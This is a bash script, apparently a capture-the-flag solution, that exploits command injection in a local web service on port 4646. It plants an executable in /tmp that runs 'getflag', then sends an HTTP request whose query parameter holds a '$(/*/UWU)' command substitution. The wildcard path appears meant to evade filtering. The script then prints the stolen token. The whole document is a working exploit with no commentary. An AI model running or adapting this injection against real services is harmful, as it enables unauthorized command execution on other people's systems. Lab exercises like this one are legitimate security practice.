#!/bin/bash

SCRIPT_NAME="UWU"
SCRIPT_PATH="/tmp/$SCRIPT_NAME"
FLAG_PATH="/tmp/owo"

rm -f $SCRIPT_PATH $FLAG_PATH

echo "#!/bin/sh" > $SCRIPT_PATH
echo "getflag > $FLAG_PATH" >> $SCRIPT_PATH

chmod +x $SCRIPT_PATH

curl -s "http://localhost:4646?x=\$(/*/$SCRIPT_NAME)" > /dev/null

sleep 1

if [ -f "$FLAG_PATH" ]; then
    echo "[+] ¡Ataque exitoso! Token obtenido:"
    cat $FLAG_PATH
else
    echo "[-] Falló el exploit. Revisa los permisos o si el servicio está activo."
fi
